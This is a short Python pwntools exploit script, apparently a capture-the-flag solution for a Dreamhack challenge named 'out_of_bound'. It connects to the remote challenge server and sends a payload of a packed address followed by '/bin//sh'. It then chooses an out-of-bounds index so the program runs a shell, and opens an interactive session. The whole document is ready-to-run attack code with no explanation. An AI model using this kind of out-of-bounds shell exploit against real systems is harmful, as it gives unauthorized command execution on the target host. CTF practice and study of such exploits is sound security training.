from pwn import *

#p = process("./out_of_bound")
p = remote("host1.dreamhack.games", 15480)
p.recvuntil("Admin name: ")

payload = b"\x08\x04\xa0\xb0"[::-1]
payload += b"/bin//sh"

p.send(payload)

p.recvuntil("What do you want?: ")
p.send("19\n")

p.interactive()